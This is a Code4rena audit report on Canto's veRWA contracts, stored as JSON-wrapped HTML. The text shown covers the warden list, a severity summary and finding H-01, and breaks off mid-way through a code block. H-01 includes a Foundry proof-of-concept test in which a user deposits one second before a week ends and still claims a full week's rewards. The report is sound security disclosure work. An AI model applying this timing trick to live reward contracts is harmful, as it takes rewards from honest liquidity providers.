{
  "circa": {
    "title": "veRWA",
    "sponsor": "Canto",
    "slug": "2023-08-verwa",
    "date": "2023-10-11",
    "findings": "https://github.com/code-423n4/2023-08-verwa-findings/issues",
    "contest": 274
  },
  "html": "<h1 id=\"overview\" style=\"position:relative;\"><a href=\"#overview\" aria-label=\"overview permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Overview</h1>\n<h2 id=\"about-c4\" style=\"position:relative;\"><a href=\"#about-c4\" aria-label=\"about c4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>About C4</h2>\n<p>Code4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.</p>\n<p>A C4 audit is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.</p>\n<p>During the audit outlined in this document, C4 conducted an analysis of the veRWA  smart contract system written in . The audit took place between August 7—August 10 2023.</p>\n<h2 id=\"wardens\" style=\"position:relative;\"><a href=\"#wardens\" aria-label=\"wardens permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Wardens</h2>\n<p>134 Wardens contributed reports to the veRWA :</p>\n<ol>\n<li><a href=\"https://code4rena.com/@ladboy233\">ladboy233</a></li>\n<li><a href=\"https://code4rena.com/@bart1e\">bart1e</a></li>\n<li><a href=\"https://code4rena.com/@deadrxsezzz\">deadrxsezzz</a></li>\n<li><a href=\"https://code4rena.com/@0xDetermination\">0xDetermination</a></li>\n<li><a href=\"https://code4rena.com/@gzeon\">gzeon</a></li>\n<li><a href=\"https://code4rena.com/@Franfran\">Franfran</a></li>\n<li><a href=\"https://code4rena.com/@Yanchuan\">Yanchuan</a></li>\n<li><a href=\"https://code4rena.com/@catellatech\">catellatech</a></li>\n<li><a href=\"https://code4rena.com/@0xComfyCat\">0xComfyCat</a></li>\n<li><a href=\"https://code4rena.com/@MrPotatoMagic\">MrPotatoMagic</a></li>\n<li>RED-LOTUS-REACH (<a href=\"https://code4rena.com/@BlockChomper\">BlockChomper</a>, <a href=\"https://code4rena.com/@DedOhWale\">DedOhWale</a>, <a href=\"https://code4rena.com/@SaharDevep\">SaharDevep</a>, <a href=\"https://code4rena.com/@reentrant\">reentrant</a>, and <a href=\"https://code4rena.com/@escrow\">escrow</a>)</li>\n<li><a href=\"https://code4rena.com/@rjs\">rjs</a></li>\n<li><a href=\"https://code4rena.com/@popular00\">popular00</a></li>\n<li><a href=\"https://code4rena.com/@cducrest\">cducrest</a></li>\n<li><a href=\"https://code4rena.com/@mert_eren\">mert_eren</a></li>\n<li><a href=\"https://code4rena.com/@immeas\">immeas</a></li>\n<li><a href=\"https://code4rena.com/@oakcobalt\">oakcobalt</a></li>\n<li><a href=\"https://code4rena.com/@SpicyMeatball\">SpicyMeatball</a></li>\n<li><a href=\"https://code4rena.com/@bin2chen\">bin2chen</a></li>\n<li><a href=\"https://code4rena.com/@Brenzee\">Brenzee</a></li>\n<li><a href=\"https://code4rena.com/@nonseodion\">nonseodion</a></li>\n<li>Team_Rocket (<a href=\"https://code4rena.com/@AlexCzm\">AlexCzm</a>, and <a href=\"https://code4rena.com/@EllipticPoint\">EllipticPoint</a>)</li>\n<li><a href=\"https://code4rena.com/@ltyu\">ltyu</a></li>\n<li><a href=\"https://code4rena.com/@thekmj\">thekmj</a></li>\n<li><a href=\"https://code4rena.com/@0xCiphky\">0xCiphky</a></li>\n<li>GREY-HAWK-REACH (<a href=\"https://code4rena.com/@Kose\">Kose</a>, <a href=\"https://code4rena.com/@aswinraj94\">aswinraj94</a>, <a href=\"https://code4rena.com/@dimulski\">dimulski</a>, <a href=\"https://code4rena.com/@aslanbek\">aslanbek</a>, and <a href=\"https://code4rena.com/@0xraion\">0xraion</a>)</li>\n<li><a href=\"https://code4rena.com/@pep7siup\">pep7siup</a></li>\n<li><a href=\"https://code4rena.com/@0xbrett8571\">0xbrett8571</a></li>\n<li><a href=\"https://code4rena.com/@kaden\">kaden</a></li>\n<li><a href=\"https://code4rena.com/@auditsea\">auditsea</a></li>\n<li><a href=\"https://code4rena.com/@markus_ether\">markus_ether</a></li>\n<li><a href=\"https://code4rena.com/@Eeyore\">Eeyore</a></li>\n<li><a href=\"https://code4rena.com/@0x73696d616f\">0x73696d616f</a></li>\n<li><a href=\"https://code4rena.com/@ppetrov\">ppetrov</a></li>\n<li><a href=\"https://code4rena.com/@QiuhaoLi\">QiuhaoLi</a></li>\n<li><a href=\"https://code4rena.com/@3docSec\">3docSec</a></li>\n<li><a href=\"https://code4rena.com/@0xDING99YA\">0xDING99YA</a></li>\n<li><a href=\"https://code4rena.com/@lsaudit\">lsaudit</a></li>\n<li><a href=\"https://code4rena.com/@Jorgect\">Jorgect</a></li>\n<li><a href=\"https://code4rena.com/@Tripathi\">Tripathi</a></li>\n<li><a href=\"https://code4rena.com/@0xSmartContract\">0xSmartContract</a></li>\n<li><a href=\"https://code4rena.com/@zhaojie\">zhaojie</a></li>\n<li><a href=\"https://code4rena.com/@qpzm\">qpzm</a></li>\n<li><a href=\"https://code4rena.com/@carrotsmuggler\">carrotsmuggler</a></li>\n<li><a href=\"https://code4rena.com/@nemveer\">nemveer</a></li>\n<li><a href=\"https://code4rena.com/@ADM\">ADM</a></li>\n<li><a href=\"https://code4rena.com/@Yuki\">Yuki</a></li>\n<li><a href=\"https://code4rena.com/@Tendency\">Tendency</a></li>\n<li><a href=\"https://code4rena.com/@Tricko\">Tricko</a></li>\n<li><a href=\"https://code4rena.com/@th13vn\">th13vn</a></li>\n<li><a href=\"https://code4rena.com/@BenRai\">BenRai</a></li>\n<li><a href=\"https://code4rena.com/@KmanOfficial\">KmanOfficial</a></li>\n<li><a href=\"https://code4rena.com/@Watermelon\">Watermelon</a></li>\n<li><a href=\"https://code4rena.com/@lanrebayode77\">lanrebayode77</a></li>\n<li><a href=\"https://code4rena.com/@seerether\">seerether</a></li>\n<li><a href=\"https://code4rena.com/@Topmark\">Topmark</a></li>\n<li><a href=\"https://code4rena.com/@RandomUser\">RandomUser</a></li>\n<li><a href=\"https://code4rena.com/@Kow\">Kow</a></li>\n<li><a href=\"https://code4rena.com/@aakansha\">aakansha</a></li>\n<li><a href=\"https://code4rena.com/@Raihan\">Raihan</a></li>\n<li><a href=\"https://code4rena.com/@0xkazim\">0xkazim</a></li>\n<li><a href=\"https://code4rena.com/@d23e\">d23e</a></li>\n<li><a href=\"https://code4rena.com/@ni8mare\">ni8mare</a></li>\n<li><a href=\"https://code4rena.com/@jat\">jat</a></li>\n<li><a href=\"https://code4rena.com/@0xhacksmithh\">0xhacksmithh</a></li>\n<li><a href=\"https://code4rena.com/@Shubham\">Shubham</a></li>\n<li><a href=\"https://code4rena.com/@klau5\">klau5</a></li>\n<li><a href=\"https://code4rena.com/@AlexCzm\">AlexCzm</a></li>\n<li><a href=\"https://code4rena.com/@sandy\">sandy</a></li>\n<li><a href=\"https://code4rena.com/@14si2o_Flint\">14si2o_Flint</a></li>\n<li><a href=\"https://code4rena.com/@merlin\">merlin</a></li>\n<li><a href=\"https://code4rena.com/@Deekshith99\">Deekshith99</a></li>\n<li><a href=\"https://code4rena.com/@windhustler\">windhustler</a></li>\n<li><a href=\"https://code4rena.com/@owadez\">owadez</a></li>\n<li><a href=\"https://code4rena.com/@supervrijdag\">supervrijdag</a></li>\n<li><a href=\"https://code4rena.com/@carlos__alegre\">carlos__alegre</a></li>\n<li><a href=\"https://code4rena.com/@hunter_w3b\">hunter_w3b</a></li>\n<li><a href=\"https://code4rena.com/@kutugu\">kutugu</a></li>\n<li><a href=\"https://code4rena.com/@0x3b\">0x3b</a></li>\n<li><a href=\"https://code4rena.com/@MatricksDeCoder\">MatricksDeCoder</a></li>\n<li><a href=\"https://code4rena.com/@castle_chain\">castle_chain</a></li>\n<li><a href=\"https://code4rena.com/@Bughunter101\">Bughunter101</a></li>\n<li><a href=\"https://code4rena.com/@Rolezn\">Rolezn</a></li>\n<li><a href=\"https://code4rena.com/@ayden\">ayden</a></li>\n<li><a href=\"https://code4rena.com/@0x4non\">0x4non</a></li>\n<li><a href=\"https://code4rena.com/@audityourcontracts\">audityourcontracts</a></li>\n<li><a href=\"https://code4rena.com/@Alhakista\">Alhakista</a></li>\n<li><a href=\"https://code4rena.com/@imkapadia\">imkapadia</a></li>\n<li><a href=\"https://code4rena.com/@InAllHonesty\">InAllHonesty</a></li>\n<li><a href=\"https://code4rena.com/@leasowillow\">leasowillow</a></li>\n<li><a href=\"https://code4rena.com/@Strausses\">Strausses</a></li>\n<li><a href=\"https://code4rena.com/@HChang26\">HChang26</a></li>\n<li><a href=\"https://code4rena.com/@_eperezok\">_eperezok</a></li>\n<li><a href=\"https://code4rena.com/@erebus\">erebus</a></li>\n<li><a href=\"https://code4rena.com/@deth\">deth</a></li>\n<li><a href=\"https://code4rena.com/@T1MOH\">T1MOH</a></li>\n<li><a href=\"https://code4rena.com/@RHaO-sec\">RHaO-sec</a></li>\n<li><a href=\"https://code4rena.com/@kaveyjoe\">kaveyjoe</a></li>\n<li><a href=\"https://code4rena.com/@JP_Courses\">JP_Courses</a></li>\n<li><a href=\"https://code4rena.com/@Naubit\">Naubit</a></li>\n<li><a href=\"https://code4rena.com/@tay054\">tay054</a></li>\n<li><a href=\"https://code4rena.com/@wahedtalash77\">wahedtalash77</a></li>\n<li><a href=\"https://code4rena.com/@halden\">halden</a></li>\n<li><a href=\"https://code4rena.com/@Mike_Bello90\">Mike_Bello90</a></li>\n<li><a href=\"https://code4rena.com/@sl1\">sl1</a></li>\n<li><a href=\"https://code4rena.com/@0xStalin\">0xStalin</a></li>\n<li><a href=\"https://code4rena.com/@devival\">devival</a></li>\n<li><a href=\"https://code4rena.com/@Bube\">Bube</a></li>\n<li><a href=\"https://code4rena.com/@p_crypt0\">p_crypt0</a></li>\n<li><a href=\"https://code4rena.com/@0xG0P1\">0xG0P1</a></li>\n<li><a href=\"https://code4rena.com/@0xmuxyz\">0xmuxyz</a></li>\n<li><a href=\"https://code4rena.com/@ch0bu\">ch0bu</a></li>\n<li><a href=\"https://code4rena.com/@SUPERMAN_I4G\">SUPERMAN_I4G</a></li>\n<li><a href=\"https://code4rena.com/@matrix_0wl\">matrix_0wl</a></li>\n<li><a href=\"https://code4rena.com/@Giorgio\">Giorgio</a></li>\n<li><a href=\"https://code4rena.com/@0xE1\">0xE1</a></li>\n<li><a href=\"https://code4rena.com/@hassan-truscova\">hassan-truscova</a></li>\n<li><a href=\"https://code4rena.com/@0xweb3boy\">0xweb3boy</a></li>\n<li><a href=\"https://code4rena.com/@fatherOfBlocks\">fatherOfBlocks</a></li>\n<li><a href=\"https://code4rena.com/@Silverskrrrt\">Silverskrrrt</a></li>\n<li><a href=\"https://code4rena.com/@0xWaitress\">0xWaitress</a></li>\n<li><a href=\"https://code4rena.com/@koxuan\">koxuan</a></li>\n<li><a href=\"https://code4rena.com/@piyushshukla\">piyushshukla</a></li>\n<li><a href=\"https://code4rena.com/@pipidu83\">pipidu83</a></li>\n<li><a href=\"https://code4rena.com/@hpsb\">hpsb</a></li>\n</ol>\n<p>This audit was judged by <a href=\"https://code4rena.com/@alcueca\">alcueca</a>.</p>\n<p>Final report assembled by PaperParachute.</p>\n<h1 id=\"summary\" style=\"position:relative;\"><a href=\"#summary\" aria-label=\"summary permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Summary</h1>\n<p>The C4 analysis yielded an aggregated total of 11 unique vulnerabilities. Of these vulnerabilities, 8 received a risk rating in the category of HIGH severity and 3 received a risk rating in the category of MEDIUM severity.</p>\n<p>Additionally, C4 analysis included 96 reports detailing issues with a risk rating of LOW severity or non-critical.</p>\n<p>All of the issues presented here are linked back to their original finding.</p>\n<h1 id=\"scope\" style=\"position:relative;\"><a href=\"#scope\" aria-label=\"scope permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scope</h1>\n<p>The code under review can be found within the <a href=\"https://github.com/code-423n4/2023-08-verwa\">C4 veRWA  repository</a>, and is composed of 3 smart contracts written in the Solidity programming language and includes 749 lines of Solidity code.</p>\n<h1 id=\"severity-criteria\" style=\"position:relative;\"><a href=\"#severity-criteria\" aria-label=\"severity criteria permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Severity Criteria</h1>\n<p>C4 assesses the severity of disclosed vulnerabilities based on three primary risk categories: high, medium, and low/non-critical.</p>\n<p>High-level considerations for vulnerabilities span the following key areas when conducting assessments:</p>\n<ul>\n<li>Malicious Input Handling</li>\n<li>Escalation of privileges</li>\n<li>Arithmetic</li>\n<li>Gas use</li>\n</ul>\n<p>For more information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on <a href=\"https://code4rena.com\">the C4 website</a>, specifically our section on <a href=\"https://docs.code4rena.com/awarding/judging-criteria/severity-categorization\">Severity Categorization</a>.</p>\n<h1 id=\"high-risk-findings-8\" style=\"position:relative;\"><a href=\"#high-risk-findings-8\" aria-label=\"high risk findings 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>High Risk Findings (8)</h1>\n<h2 id=\"h-01-user-doesnt-have-to-deposit-for-a-week-into-the-market-to-get-their-weekly-reward-from-the-lendingledger\" style=\"position:relative;\"><a href=\"#h-01-user-doesnt-have-to-deposit-for-a-week-into-the-market-to-get-their-weekly-reward-from-the-lendingledger\" aria-label=\"h 01 user doesnt have to deposit for a week into the market to get their weekly reward from the lendingledger permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/416\">[H-01] User doesn’t have to deposit for a week into the market to get their weekly reward from the <code>LendingLedger</code></a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/416\">SpicyMeatball</a>, also found by <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/435\">mert_eren</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/399\">nonseodion</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/307\">cducrest</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/277\">immeas</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/156\">popular00</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/88\">0xComfyCat</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/73\">GREY-HAWK-REACH</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/71\">Yanchuan</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/463\">ppetrov</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/395\">kaden</a>, and <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/104\">pep7siup</a></em></p>\n<p>In the <code>LendingLedger</code> contract, a user is rewarded with CANTO tokens depending on how long he has his deposit in the market. Rewards are distributed for each week during which the deposit was inside the market. However, the user can cheat this condition because we are rounding down to the start of the week, so the user can deposit at 23:59 at the end of the week and withdraw at 00:00 and still get rewarded as if he had his deposit for the whole week.</p>\n<h3 id=\"proof-of-concept\" style=\"position:relative;\"><a href=\"#proof-of-concept\" aria-label=\"proof of concept permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<details>\n<p>Test case for the <code>LendingLedger.t.sol</code></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"0\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    function setupStateBeforeClaim() internal {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        whiteListMarket();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.prank(goverance);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        ledger.setRewards(0, WEEK*10, amountPerEpoch);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // deposit into market at 23:59 (week 4)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.warp((WEEK * 5) - 1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        int256 delta = 1.1 ether;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.prank(lendingMarket);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        ledger.sync_ledger(lender, delta);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // airdrop ledger enough token balance for user to claim</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        payable(ledger).transfer(1000 ether);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // withdraw at 00:00 (week 5)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.warp(block.timestamp + 1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.prank(lendingMarket);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        ledger.sync_ledger(lender, delta * (-1));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function testClaimValidLenderOneEpoch() public {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        setupStateBeforeClaim();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 balanceBefore = address(lender).balance;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.prank(lender);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        ledger.claim(lendingMarket, 0, type(uint256).max);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 balanceAfter = address(lender).balance;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        assertTrue(balanceAfter - balanceBefore == 1 ether);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 claimedEpoch = ledger.userClaimedEpoch(lendingMarket, lender);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        assertTrue(claimedEpoch - WEEK*4 == WEEK);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n</details>\n<h3 id=\"tools-used\" style=\"position:relative;\"><a href=\"#tools-used\" aria-label=\"tools used permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>Foundry</p>\n<h3 id=\"recommended-mitigation-steps\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps\" aria-label=\"recommended mitigation steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>It’s difficult to propose a solution for this exploit without major changes in the contract’s architecture. Perhaps we can somehow split the amount based on the time the sync was made inside the week, let’s say Alice’s <code>last_sync</code> was in the middle of week0, she deposited 1 ether, thus her amount for the current epoch will be 1/2 ether. However there is a caveat, how do we fill the gaps? We can’t fill them with 1/2 ether. We can use this struct though,</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"1\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">Amount {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256 actualAmount,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256 fraction</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<p>so we can use <code>fraction</code> for the current epoch and <code>actualAmount = 1 ether</code> to fill the gaps.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/416#issuecomment-1693188476\">alcueca (Judge) increased severity to High and commented</a>:</strong></p>\n<blockquote>\n<p>Chosen as best due to clarity, conciseness, and presence of executable PoC</p>\n</blockquote>\n<blockquote>\n<p>The rationale behind the High severity is that the purpose of veRWA is to attract liquidity to certain contracts as voted by CANTO holders, and this vulnerability defeats the purpose of attracting liquidity completely.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/416#issuecomment-1702661143\">OpenCoreCH (veRWA) commented</a>:</strong></p>\n<blockquote>\n<p>Reward calculation is now based on a time-weighted balance. Btw, while implementing the fix I noticed that the PoC here does not really highlight the problem. In the PoC, there is only one lender, so even if we take the deposit time into account, this lender should receive 100% of the epoch rewards (as they provided 100% of the liquidity within the market during this epoch). I modified the PoC to a scenario where there are two lenders, with one that deposited only for one second and one for the whole week. The one that deposited for the whole week should receive ~604800 times more rewards for this epoch, which is now the case:</p>\n</blockquote>\n<details>\n<blockquote>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"2\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testTimeWeightedClaiming</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">whiteListMarket</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">int256</span><span class=\"mtk1\"> </span><span 